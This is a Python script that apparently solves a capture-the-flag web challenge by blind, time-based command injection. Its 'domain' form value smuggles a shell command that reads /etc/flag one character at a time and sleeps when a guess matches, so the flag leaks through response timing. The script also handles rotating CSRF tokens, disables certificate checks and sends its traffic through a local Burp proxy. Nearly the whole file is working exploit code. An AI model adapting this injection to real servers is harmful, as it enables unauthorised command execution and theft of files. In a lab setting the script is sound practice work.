import requests
from lxml import html
from urllib.parse import quote
import itertools
# Disable SSL verification errors and warnings (not recommended for production)
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define the URL
url = "https://mock.hackme.secops.group:8000/index.php"  # Replace with the actual URL

# Raw headers as text
raw_headers = """Cookie: PHPSESSID=a94269016dd341237ccafaa3d653fa58
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Origin: https://mock.hackme.secops.group:8000
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://mock.hackme.secops.group:8000/index.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i
Connection: keep-alive"""

# Proxy configuration for Burp Suite
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

# Parse the raw headers into a dictionary
def parse_raw_headers(raw_headers):
    headers = {}
    for line in raw_headers.strip().split("\n"):
        key, value = line.split(":", 1)
        headers[key.strip()] = value.strip()
    return headers

headers = parse_raw_headers(raw_headers)

# Extract CSRF token from the response
def extract_csrf_token(response_text):
    tree = html.fromstring(response_text)
    csrf_token = tree.xpath('//input[@name="token"]/@value')
    if csrf_token:
        return csrf_token[0]  # Return the first token found
    print(response_text)
    raise Exception("Failed to retrieve CSRF token from the response")

# Send the POST request and extract the new CSRF token
def send_post_request(test_input, ctr, csrf_token):
    # URL-encode the domain value
    domain = f'localhost;if [ $(cat /etc/flag | cut -c{ctr}) = "{test_input}" ]; then sleep 5; fi; #'
    encoded_domain = quote(domain)
    # Prepare the body
    body = f"domain={encoded_domain}&token={csrf_token}"
    # POST request to submit the form
    response = requests.post(url, headers=headers, data=body, proxies=proxies, verify=False)
    response_time = response.elapsed.total_seconds()  # Get response time in seconds

    # Extract the new CSRF token from the response
    new_csrf_token = extract_csrf_token(response.text)
    return response, response_time, new_csrf_token

# Generate all alphanumeric characters and curly brackets
def generate_inputs():
    characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}"
    for length in range(1, 3):  # Try combinations of length 1 and 2
        for combination in itertools.product(characters, repeat=length):
            yield "".join(combination)

flag = ""
ctr = 1
# Example usage
try:
    # Initial GET request to fetch the first CSRF token
    initial_response = requests.get(url)
    initial_response.raise_for_status()  # Ensure the GET request is successful
    csrf_token = extract_csrf_token(initial_response.text)
    # print(f"Initial CSRF token: {csrf_token}")

    # Loop through test inputs
    for i in range(31):
        for test_input in generate_inputs():
            print(f"{test_input}")
            # print(f"Testing with domain: {test_input}")
            response, response_time, csrf_token = send_post_request(test_input, ctr, csrf_token)
            # print(f"Response Status Code: {response.status_code}")
            # print(f"Response Time: {response_time} seconds")
            # print(f"New CSRF token: {csrf_token}")
            if response_time >= 5:  # Stop if successful
                ctr += 1
                flag += test_input
                print(f"\nflag: {flag}")
                break
except Exception as e:
    print(f"An error occurred: {e}")
